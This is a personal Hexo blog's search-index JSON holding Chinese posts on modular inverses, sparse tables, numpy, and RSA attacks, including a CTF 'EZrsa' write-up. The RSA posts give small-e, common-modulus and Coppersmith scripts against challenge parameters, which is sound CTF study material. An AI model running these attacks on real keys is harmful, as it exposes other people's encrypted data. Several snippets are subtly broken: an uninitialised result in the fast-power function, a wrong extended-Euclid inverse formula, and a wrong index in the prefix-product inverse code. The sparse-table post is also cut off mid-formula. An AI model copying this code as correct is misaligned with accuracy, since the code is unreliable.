{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://zzuzyj.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2022-05-03T09:23:29.721Z","updated":"2022-04-18T11:52:12.000Z","comments":false,"path":"/404.html","permalink":"http://zzuzyj.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2022-05-03T09:23:29.731Z","updated":"2022-04-18T11:52:12.000Z","comments":false,"path":"about/index.html","permalink":"http://zzuzyj.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"书单","date":"2022-05-03T09:23:29.740Z","updated":"2022-04-18T11:52:12.000Z","comments":false,"path":"books/index.html","permalink":"http://zzuzyj.github.io/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2022-05-03T09:23:29.749Z","updated":"2022-04-18T11:52:12.000Z","comments":false,"path":"categories/index.html","permalink":"http://zzuzyj.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-05-03T09:23:29.773Z","updated":"2022-04-18T11:52:12.000Z","comments":false,"path":"repository/index.html","permalink":"http://zzuzyj.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-05-03T09:23:29.764Z","updated":"2022-04-18T11:52:12.000Z","comments":true,"path":"links/index.html","permalink":"http://zzuzyj.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-05-03T09:23:29.783Z","updated":"2022-04-18T11:52:12.000Z","comments":false,"path":"tags/index.html","permalink":"http://zzuzyj.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"乘法逆元","slug":"乘法逆元","date":"2022-05-03T09:23:29.923Z","updated":"2022-05-03T12:08:12.724Z","comments":true,"path":"2022/05/03/乘法逆元/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/%E4%B9%98%E6%B3%95%E9%80%86%E5%85%83/","excerpt":"","text":"乘法逆元介绍 求逆元的方法 1 费马小定理+快速幂 快速幂写法 逆元求法 注意事项 2 拓展欧几里得 求解拓展欧几里得 求解逆元 3 线性求逆元 情况1 情况2 乘法逆元介绍 如果一个线性同余方程 ax \\equiv 1\\pmod{n}，则 x 称为 a 的逆元，记作a^{-1} 。求逆元的方法1 费马小定理+快速幂 \\because a*x\\equiv 1 \\pmod n\\\\ \\therefore a*x\\equiv a^{n-1}\\pmod n\\\\ \\therefore x=a^{n-2}\\pmod n快速幂写法12345678ll fastmi(ll a,ll b,ll mod)&#123; ll ans; while(b)&#123; if(b&amp;1)ans=ans*a%mod; b&gt;&gt;=1;a=a*a%mod; &#125; return ans;&#125; 逆元求法123ll invert(ll a,ll p)&#123; return fastmi(a,p-2,p);&#125; 注意事项由于费马小定理中的模数是一个质数，所以说这种利用快速幂求解逆元的方法只能用在模数是质数的情况下。 2 拓展欧几里得拓展欧几里得 a*x+b*y=1\\\\ 而我们求逆元时，a*x\\equiv 1 \\pmod b=>a*x\\equiv 1+n*y\\\\ 由此可见逆元x不就是拓展欧几里得方程的一个正解吗求解拓展欧几里得12345678void exgcd(ll a,ll b,ll&amp;x,ll&amp;y)&#123; if (b == 0) &#123; x = 1, y = 0; return; &#125; exgcd(b, a % b, y, x); y -= a / b * x;&#125; 求解逆元12345ll invert(ll a,ll p)&#123; ll x,y; exgcd(a,p,x,y); return (x+x%p)%p;&#125; 3 线性求逆元情况1求1-n关于p的逆元 分析求解一些数字对于同一个数的逆元（大概率是质数，不然和很可能没有逆元纯在） 依次单个求解会非常的慢，这里我们学习一下线性求解逆元的方法 首先乘法逆元中1的逆元是自己 1^{-1}\\equiv1 \\pmod p 对于每一个逆元i^{-1},我们令k=\\lfloor \\frac {p}{i} \\rfloor,j=p\\pmod i,有p=k*i+j\\\\ 在有限域p的作用下也就是k*i+j\\equiv 0 \\pmod p，两边同时乘于i^{-1}*j^{-1}:\\\\ 于是有k*j^{-1}+i^{-1}\\equiv 0 \\pmod p\\\\ i^{-1}\\equiv -k *j^{-1}\\pmod p\\\\ i^{-1}\\equiv -\\lfloor \\frac{p}{i}\\rfloor {(p \\pmod i)}^{-1}\\pmod p\\\\代码实现1234inv[1] = 1;for (int i = 2; i &lt;= n; ++i) &#123; inv[i] = (long long)(p - p / i) * inv[p % i] % p;&#125; 情况2如果让你求a[1]-a[n]的逆元呢？ 分析 我们用s[N]记录前缀积，s[i]=i!,用单个求逆元的方法求出s[N]关于p的逆元\\\\，用sv[N]记录 然后递推sv[i-1]=sv[i]*a[i] \\pmod p 得到每个s[i]\\\\关于p的逆元sv[i], 且 sv[i]*s[i]=1\\pmod p;\\\\ sv[i]*s[i-1]=a[i]^{-1} \\pmod p;\\\\ a[i]^{-1}=sv[i]*s[i-1]\\pmod p;代码实现123456789s[0]=1;for(int i=1;i&lt;=n;i++) s[i]=s[i-1]*a[i]%p;sv[n]=invert(s[i],p);求单个逆元两种方法都可for(int i=n;i&gt;=1;i--) sv[i-1]=sv[i]*a[i]%p;for(int i=1;i&lt;=n;i++) inv[i]=sv[i]*s[i-1]%p;","categories":[{"name":"acm","slug":"acm","permalink":"http://zzuzyj.github.io/categories/acm/"}],"tags":[{"name":"数学","slug":"数学","permalink":"http://zzuzyj.github.io/tags/%E6%95%B0%E5%AD%A6/"}]},{"title":"st表模板","slug":"st表","date":"2022-05-03T09:23:29.918Z","updated":"2022-04-24T13:12:08.000Z","comments":true,"path":"2022/05/03/st表/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/st%E8%A1%A8/","excerpt":"","text":"st表 介绍及其代码实现 1 st表创建 2 st表查询 模板题 P3865 【模板】ST 表 st表介绍及其代码实现ST （Spares Table，稀疏表） 算法主要运用了倍增的思想，初始化在O(nlogn) 时间构造一个二维表，可以用仅仅O（1)的时间处理查询区间[L,R]的最值问题，大大节省了查询的时间.另外， 例如“区间按位和”、“区间按位或”、“区间 GCD”，ST 表都能高效地解决。 设F[i,j]表示[i,i+2^j-1]区间的最值，区间长度为2^j,我们可以将其分为长度为2^{j-1}的两个区间，\\\\ 然后求两个子区间的最值，递推可得公式\\\\ f[i][j]=max(f[i][j-1],f[i+(1","categories":[{"name":"algorithm","slug":"algorithm","permalink":"http://zzuzyj.github.io/categories/algorithm/"},{"name":"模板","slug":"algorithm/模板","permalink":"http://zzuzyj.github.io/categories/algorithm/%E6%A8%A1%E6%9D%BF/"}],"tags":[{"name":"st表","slug":"st表","permalink":"http://zzuzyj.github.io/tags/st%E8%A1%A8/"},{"name":"倍增","slug":"倍增","permalink":"http://zzuzyj.github.io/tags/%E5%80%8D%E5%A2%9E/"}]},{"title":"RSA攻击","slug":"RSA","date":"2022-05-03T09:23:29.913Z","updated":"2022-04-19T03:01:06.000Z","comments":true,"path":"2022/05/03/RSA/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/RSA/","excerpt":"","text":"基础类型，给定p,q,e,c12345678910from libnum import *p=q=e=c=n=p*qphi=(p-1)*(q-1)d=invmod(e,phi)m=pow(c,d,n)print(n2s(int(m))) 可直接分解的N（p,q）运用yafu分解 运用网站在线分解 http://www.factordb.com 小e攻击e非常小，可以直接开根拿到m 123456789101112from gmpy2 import *from libnum import *k=0e=c=n=while True: m=c+n*k k+=1 flag=iroot(m,e) if(flag[0]): print(n2s(int(flag[1]))) 共模攻击（n,m相同，c,e不同）n不变，可以根据e1,e2,c1,c2,n可以不求d1,d2直接求解m e1,e2互素 gcd(e1,e2)=1 则 e1*s1+e2*s2=1,s1,s2均为整数，s1,s2一正一负，通过gmpy2 的gcdext(e1,e2)可以计算出(s1,s2)\\\\又 c_1 \\equiv m^{e_1} \\bmod n,c_2\\equiv m^{e_2}\\bmod n.\\\\ 则(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1}\\bmod n)^{s_1}(m^{e_2}\\bmod n)^{s_2})\\bmod n\\\\ 化简 (c_1^{s_1}c_2^{s_2})\\bmod n = (m^{e_1s_1+e_2s_2})\\bmod n\\\\ 又e1*s1+e2*s2=1\\\\ 则c_1^{s_1}*c_2^{s_2}=m12345678910111213141516171819from gmpy2 import *from libnum import *def deattack(e1,e2,c1,c2,n): g,s1,s2=gcdext(e1,e2) if s1&lt;0: s1=-s1 c1=invert(c1,n) if s2&lt;0: s2=-s2 c2=invert(c2,n) m=pow(c1,s1,n)*pow(c2,s2,n)%n return int(m)e1=e2=c1=c2=n=flag=deattack(e1,e2,c1,c2,n)print(n2s(flag))","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://zzuzyj.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"http://zzuzyj.github.io/tags/RSA/"}]},{"title":"numpylearn","slug":"numpylearn","date":"2022-05-03T09:23:29.906Z","updated":"2022-04-28T12:25:14.000Z","comments":true,"path":"2022/05/03/numpylearn/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/numpylearn/","excerpt":"","text":"numpy 官方文档 https://numpy.org/doc/stable/reference/ 初识数组 初始数组 认识类型 查询属性 初始赋值 类型转换 一维操作 索引切片 元素运算 矢量运算 搜索排序 数理统计 读取保存 numpy官方文档 初识数组初始数组array()12345import numpy as npls=[1,2,3,4,5,6,7,8]a=np.array(ls)print(a)# [1 2 3 4 5 6 7 8] 认识类型dtype12345678910111213141516import numpy as np# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]a =np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9],dtype=np.bool)b =np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9],dtype=np.int8)c =np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9],dtype=np.uint8)d =np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9],dtype=np.float16)print(a,a.dtype)print(b,b.dtype)print(c,c.dtype)print(d,d.dtype) #[False True True True True True True True True True] bool#[0 1 2 3 4 5 6 7 8 9] int8#[0 1 2 3 4 5 6 7 8 9] uint8#[0. 1. 2. 3. 4. 5. 6. 7. 8. 9.] float16 查询属性 属性 说明 .dtype 数组元素的数据类型 .ndim 数组的维度的个数 .shape 数组的形状 .size 数组元素的总数 .itemsize 数组中的每个元素的字节大小 1234567891011121314151617181920import numpy as npa = np.array([ [4.8, 6], [4.38, 5.5], [4.45, 6], [9.5, 12.8], [3.5, 5.5], [3.5, 5.5], [9.5, 12.8], [1.875, 2.3], [1.875, 2.3], [1.875, 2.3], [4.38, 5.5], [4.4, 5.5], [4.4, 5.5], [4.4, 5.5], [4.45, 6], [4.45, 6], [4.45, 6], ])print(&quot;类型：&#123;&#125;&quot;.format(a.dtype))print(&quot;维度：&#123;&#125;&quot;.format(a.ndim))print(&quot;形状：&#123;&#125;&quot;.format(a.shape))print(&quot;元素总数：&#123;&#125;&quot;.format(a.size))print(&quot;元素字节大小：&#123;&#125;&quot;.format(a.itemsize))print(&quot;数组所占内存空间：&#123;&#125;&quot;.format(a.size*a.itemsize))# 类型：float64# 维度：2# 形状：(17, 2)# 元素总数：34# 元素字节大小：8# 数组所占内存空间：272 初始赋值 函数 说明 np.arange() 类似range()函数 np.ones(shape) 根据shape生成一个全一的数组，shape是一个元组 np.zeros(shape) 根据shape生成一个全0数组，shape是一个元组 np.linspace() 根据气质数据等间距地填充数据，形成数组 np.concatetenate() 将两个或多个数组合并成一个新的数组 np.full(shape,val) 根据shape生成一个全为val的数组 np.eye(n) 创建一个n*n的矩阵，对角线为1,其余为0 np.ones_like(a) 根据a的形状生成一个全为1的数组 np.zeros_like(a) 根据a的形状生成一个全为0的数组 np.full_like(a,val) 根据a的形状生成一个全为val的数组 1234567891011121314151617181920212223import numpy as npimport matplotlib.pyplot as plta = np.arange(10)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, np.arange(0.1, 2.0, 0.1))print(&quot;&gt;&gt;&gt; &quot;, np.ones(10))print(&quot;------------------------------------------------------------------------------------------&quot;)print(&quot;&gt;&gt;&gt; &quot;, np.ones((3, 3)))print(&quot;&gt;&gt;&gt; &quot;, np.zeros(8))print(&quot;------------------------------------------------------------------------------------------&quot;)print(&quot;&gt;&gt;&gt; &quot;, np.linspace(1, 2))print(&quot;&gt;&gt;&gt; &quot;, np.linspace(1, 2, endpoint=False))print(&quot;------------------------------------------------------------------------------------------&quot;)print(&quot;&gt;&gt;&gt; &quot;, np.linspace(1, 2, num=5))x1 = np.linspace(0, 1, num=10)x2 = np.linspace(1, 2, num=10)y = np.zeros(10)plt.plot(x1, y, &quot;o&quot;)plt.plot(x2, y, &quot;o&quot;)plt.show() 12345678910import numpy as npimport matplotlib.pyplot as plta = np.arange(0, 10)b = np.arange(10, 20)print(&quot;&gt;&gt;&gt; &quot;, np.concatenate((a, b)))data = np.random.normal(2, 0.1, 100000)plt.hist(data, 1000)plt.show() 123456import numpy as npimport matplotlib.pyplot as pltdata = np.random.beta(2, 2, 100000)plt.hist(data, 1000)plt.show() 等等…… 类型转换 函数 属性 .astype(new_type) 强制转换数组的数据类型 .tolist() 返回数组数据的副本作为（嵌套的）python列表 123456789101112131415import numpy as npa = np.arange(1, 5, 0.5)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, a.dtype)print(&quot;&gt;&gt;&gt; &quot;, a.astype(np.int32))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.array([[1, 2, 5], [6, 3, 4], [5, 6, 0]])b = a.tolist()print(&quot;&gt;&gt;&gt; &quot;, b)print(&quot;&gt;&gt;&gt; &quot;, type(b))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.array([&quot;1.2&quot;, &quot;2.4&quot;, &quot;3.1415&quot;])print(&quot;&gt;&gt;&gt; &quot;, a.itemsize * a.size)print(&quot;&gt;&gt;&gt; &quot;, a.astype(np.float64)) 一维操作索引切片12345678910111213import numpy as npa = np.arange(10)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, a[-1])print(&quot;&gt;&gt;&gt; &quot;, a[9])print(&quot;&gt;&gt;&gt; &quot;, a[1])print(&quot;&gt;&gt;&gt; &quot;, a[[1, 5, 2]])# &gt;&gt;&gt; [0 1 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; 9# &gt;&gt;&gt; 9# &gt;&gt;&gt; # &gt;&gt;&gt; [1 5 2] 1234567891011121314151617import numpy as npa = np.arange(10)print(&quot;&gt;&gt;&gt; &quot;, a)b = [True, True, False, False, False, True, True, False, False, False]print(&quot;&gt;&gt;&gt; &quot;, a[b])print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.arange(10)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, a[1:4])print(&quot;&gt;&gt;&gt; &quot;, a[0:6:2])# &gt;&gt;&gt; [0 1 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; [0 1 5 6]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [0 1 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; [1 2 3]# &gt;&gt;&gt; [0 2 4] 1234567891011121314151617181920212223242526import numpy as npa = np.arange(10)b = a[0:6]print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, b)b[1] = 1000print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, b)print(&quot;------------------------------------------------------------------------------------------&quot;)a = list(range(10))b = a[0:6]print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, b)b[1] = 1000print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, b)# &gt;&gt;&gt; [0 1 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; [0 1 2 3 4 5]# &gt;&gt;&gt; [ 0 1000 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; [ 0 1000 2 3 4 5]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]# &gt;&gt;&gt; [0, 1, 2, 3, 4, 5]# &gt;&gt;&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]# &gt;&gt;&gt; [0, 1000, 2, 3, 4, 5] 元素运算 函数 属性 函数 属性 abs 计算绝对值 divide 数组元素相除 fabs 计算绝对值，比abs快 floor_divide 返回整数结果，先调用divide，再调用floor函数 sqrt 以元素为单位返回数组的非负平方根 power 第一个数组元素从第二个数组逐元素提升为幂s。 square 返回输入的元素的平方 maximum 数组元素最大值 exp 计算输入数组中所有元素的指数 fmax 数组元素最大值 log 底数计算 minimum 数组元素最小值 rint 将数组的元素四舍五入 fmin 数组元素最小值 ceil 向上取整 mod 返回元素的除法余数 floor 向下取整 copysign 按元素方式将x1的符号更改为x2的符号 isnan 对nan逐个元素进行测试，并返回bool数组 greater 返回x1&gt;x2的真值 cos 返回余弦值 greater_equal 返回x1&gt;=x2的真值 sin 返回正弦值 less 返回x1&lt;x2的真值 arctanh 反双曲函数的返回值 less_equal 返回x1&lt;=x2的真值 add 逐元素相加 equal 返回x1=x2的真值 subtract 逐元素相减 not_equal 返回x1!=x2的真值 multiply 逐元素相乘 12345678910111213141516171819202122232425import numpy as npa = np.arange(-10, 10)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, np.abs(a))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.arange(10)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, np.sqrt(a))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.random.randint(0, 100, 15)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, np.max(a))# &gt;&gt;&gt; [-10 -9 -8 -7 -6 -5 -4 -3 -2 -1 0 1 2 3 4 5 6 7# 8 9]# &gt;&gt;&gt; [10 9 8 7 6 5 4 3 2 1 0 1 2 3 4 5 6 7 8 9]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [0 1 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; [0. 1. 1.41421356 1.73205081 2. 2.23606798# 2.44948974 2.64575131 2.82842712 3. ]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [ 1 74 33 21 22 59 57 56 26 25 85 0 8 53 38]# &gt;&gt;&gt; 85 123456789101112131415161718192021222324252627282930import numpy as npa = np.arange(10)b = np.arange(10)print(&quot;&gt;&gt;&gt; &quot;, a, b)c = np.ones(10)d = np.add(a, b, out=c)print(&quot;&gt;&gt;&gt; &quot;, c)print(&quot;&gt;&gt;&gt; &quot;, id(c), id(d))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.array([3, 5, 2, 5, 7, 4, 7, 0])b = np.array([0, 9, 0, 9, 0, 9, 0, 9])print(&quot;&gt;&gt;&gt; &quot;, np.maximum(a, b))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.array([3, 5, 2, 5, 7, 4, 7, 0])b = np.array([0, 9, 0, 9, 0, 9, 0, 9])c = np.greater(a, b)print(&quot;&gt;&gt;&gt; &quot;, c)print(&quot;&gt;&gt;&gt; &quot;, a[c])# &gt;&gt;&gt; [0 1 2 3 4 5 6 7 8 9] [0 1 2 3 4 5 6 7 8 9]# &gt;&gt;&gt; [ 0. 2. 4. 6. 8. 10. 12. 14. 16. 18.]# &gt;&gt;&gt; 2591797890768 2591797890768# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [3 9 2 9 7 9 7 9]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [ True False True False True False True False]# &gt;&gt;&gt; [3 2 7 7] 矢量运算四则运算 123456789import numpy as npx = np.array([4, 3, 6, 7, 4, 2, 5, 6])y = np.array([1, 1, 0, 0, 1, 1, 0, 0])print(&quot;&gt;&gt;&gt; &quot;, x * 2)print(&quot;&gt;&gt;&gt; &quot;, x + y, x - y, x * y, x / y)# &gt;&gt;&gt; [ 8 6 12 14 8 4 10 12]# &gt;&gt;&gt; [5 4 6 7 5 3 5 6] [3 2 6 7 3 1 5 6] [4 3 0 0 4 2 0 0] [ 4. 3. inf inf 4. 2. inf inf] 复杂的逻辑运算和多元运算 123456789101112131415161718192021222324252627282930import numpy as npx = np.array([4, 3, 6, 7, 4, 2, 5, 6])y = np.array([1, 1, 0, 0, 1, 1, 0, 0])print(&quot;&gt;&gt;&gt; &quot;, x &gt; 2)print(&quot;&gt;&gt;&gt; &quot;, x == 2)print(&quot;&gt;&gt;&gt; &quot;, x &lt; 2)print(&quot;&gt;&gt;&gt; &quot;, x &gt; y, x == y)print(&quot;&gt;&gt;&gt; &quot;, np.logical_and(x, y))print(&quot;------------------------------------------------------------------------------------------&quot;)print(&quot;&gt;&gt;&gt; &quot;, x[x &gt; 5])x[x == 4] = 99print(&quot;&gt;&gt;&gt; &quot;, x)x[y == 0] = 0print(&quot;&gt;&gt;&gt; &quot;, x)print(&quot;------------------------------------------------------------------------------------------&quot;)x = np.array([-4, -3, 6, -7, 4, -2, 5, -6])print(&quot;&gt;&gt;&gt; &quot;, np.where(x &gt; 0, 1, -1))# &gt;&gt;&gt; [ True True True True True False True True]# &gt;&gt;&gt; [False False False False False True False False]# &gt;&gt;&gt; [False False False False False False False False]# &gt;&gt;&gt; [ True True True True True True True True] [False False False False False False False False]# &gt;&gt;&gt; [ True True False False True True False False]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [6 7 6]# &gt;&gt;&gt; [99 3 6 7 99 2 5 6]# &gt;&gt;&gt; [99 3 0 0 99 2 0 0]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; [-1 -1 1 -1 1 -1 1 -1] 搜索排序 函数 说明 numpy.sort() 返回数组的排序副本 ndarray.sort() 就地排序数组 numpy.searchsorted() 查找应在其中插入元素以保持顺序的索引 numpy.count_nonzero() 统计数组非0个数 numpy.where() 根据条件从x或者y中选择返回的元素 123456789101112import numpy as npimport matplotlib.pyplot as plta = np.random.randint(0, 100, 200)plt.scatter(range(200), a)plt.show()np.sort(a)plt.scatter(range(200), a)plt.show()a.sort()plt.scatter(range(200), a)plt.show() 123456789101112131415161718192021import numpy as npa = np.random.randint(0, 100, 10)a.sort()print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, np.searchsorted(a, 5))print(&quot;&gt;&gt;&gt; &quot;, np.insert(a, np.searchsorted(a, 5), 5))print(&quot;&gt;&gt;&gt; &quot;, np.append(a, 100))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.array([1, 2, 3, 1, 1, 1, 2, 3, 4])print(&quot;&gt;&gt;&gt; &quot;, np.where(a == 1))a = np.array([0, 1, 0, 2, 0, 2, 0, 3, 0, 4])print(&quot;&gt;&gt;&gt; &quot;, np.count_nonzero(a))# &gt;&gt;&gt; [11 23 32 47 57 64 68 72 86 86]# &gt;&gt;&gt; 0# &gt;&gt;&gt; [ 5 11 23 32 47 57 64 68 72 86 86]# &gt;&gt;&gt; [ 11 23 32 47 57 64 68 72 86 86 100]# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; (array([0, 3, 4, 5], dtype=int64),)# &gt;&gt;&gt; 5 数理统计 函数 说明 np.sum() 计算数组元素的总和 np.mean() 计算数组元素的平均值 np.std() 计算数组的标准差 np.average() 计算数组的加权平均值 np.cumsum() 数组元素的累加和(前缀和数组) np.cumprod() 数组元素的累乘积 np.unique(x) 计算x中的唯一元素,并返回有序结果 np.intersectld(x,y) 计算x和y的公共元素，返回有序结果 np.unionld(x,y) 计算x和 y的并集，返回有序结果 np.inld(x,y) 得到一个表示x 的元素是否包含于y的布尔型数组 np.setdiffld(x,y) 集合差，即元素在x中且不在y中 np.setxorld(x,y) 集合对称差，在一个数组中单不同时存在于两个数组 123456789101112131415161718192021222324252627import numpy as npa = np.arange(101)print(&quot;&gt;&gt;&gt; &quot;, a)print(&quot;&gt;&gt;&gt; &quot;, np.sum(a))print(&quot;&gt;&gt;&gt; &quot;, np.mean(a))print(&quot;&gt;&gt;&gt; &quot;, np.std(a))print(&quot;------------------------------------------------------------------------------------------&quot;)a = np.array([80, 67, 61])print(&quot;&gt;&gt;&gt; &quot;, np.average(a))print(&quot;&gt;&gt;&gt; &quot;, np.mean(a))weight = [60, 20, 20]print(&quot;&gt;&gt;&gt; &quot;, np.average(a, weights=weight))# &gt;&gt;&gt; [ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17# 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35# 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53# 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71# 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89# 90 91 92 93 94 95 96 97 98 99 100]# &gt;&gt;&gt; 5050# &gt;&gt;&gt; 50.0# &gt;&gt;&gt; 29.154759474226502# ------------------------------------------------------------------------------------------# &gt;&gt;&gt; 69.33333333333333# &gt;&gt;&gt; 69.33333333333333# &gt;&gt;&gt; 73.6 读取保存","categories":[{"name":"python","slug":"python","permalink":"http://zzuzyj.github.io/categories/python/"}],"tags":[{"name":"numpy","slug":"numpy","permalink":"http://zzuzyj.github.io/tags/numpy/"}]},{"title":"星CTF_EZrsa","slug":"CTF_EZrsa","date":"2022-05-03T09:23:29.901Z","updated":"2022-04-22T10:42:54.000Z","comments":true,"path":"2022/05/03/CTF_EZrsa/","link":"","permalink":"http://zzuzyj.github.io/2022/05/03/CTF_EZrsa/","excerpt":"","text":"EZrsa题目12345678910111213141516171819202122from Crypto.Util.number import getStrongPrimefrom gmpy import next_primefrom random import getrandbitsfrom flag import flag p=getStrongPrime(1024)q=next_prime(p^((1&lt;&lt;900)-1)^getrandbits(300))n=p*qe=65537 m=int(flag.encode(&#x27;hex&#x27;),16)assert m&lt;nc=pow(m,e,n) print(hex(n))#0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3 print(hex(c))#0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1bea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52ff2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1 题目分析&amp;解答p是1024位的随机素数，q=next_prime(p^((1&lt;&lt;900)-1)^getranbits(300)),即q是p异或1&lt;&lt;900-1再异或一个300bits的随机数的下一个素数 根据异或的性质，我们可以很容易得知p和q的高124位是相同的，而且n=p*q，且n是已经知道的 拆分p,q, p=p_{high}*2^{900}+p_{low}\\\\ q=q_{high}*2^{900}+q_{low}\\\\ 令x=p_{high},则x也等于q_{high}\\\\ p_{low}+q_{low}=2^{900}-1+cc,cc是300位随机数异或后的改变量，相对较小，当然不是真的小。\\\\ n=p*q(2^{1800}*x^2+2^{900}*x(p_{low}+q_{low})\\\\+p_{low}*q_{low})=2^{1800}*x^2+2^{1800}*x+smallnum,两边//2^{1800}得到\\\\ n//2^{1800}=x^2+x,x可解直接开根可得x 12345from gmpy2 import irootn=0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3nn=n//(2**1800)print(iroot(nn,2)[0])#20226195070633070235386534147535171929 即x=20226195070633070235386534147535171929, 接下来就是如何求p,q了，由于p+q为定值，可知若p==q，p*q越大，当p,q越不相近p,q越小，再根据n，我们可以求出,p,q的大概值 12345678910x=20226195070633070235386534147535171929p = x&lt;&lt;900 | (2**900 - 1)q = x&lt;&lt;900# Start from 125th bits (1024-125)for i in range(899, 301, -1): cur = 1&lt;&lt;i if (p^^cur) * (q^^cur) &lt; n: p^^= cur q^^= curprint(hex(p)) 由性质可知p的大概值和真实的p存在差异，但是具体不知道，然后可以继续进行爆破，截取一部分足够的高位进行coppersmith爆破， 我们直接截取coppersmith所能爆破的最大限度，如果还没结果就寄吧 1234567891011121314from libnum import *n = p = c = PR.&lt;x&gt; = PolynomialRing(Zmod(n))f=x+proots=f.small_roots(X=2**430,beta=0.4)p=int(p+roots[0])assert n%p==0q = n//pphi = (p-1)*(q-1)d = inverse(65537, phi)print(n2s(int(pow(c,d,n))))# 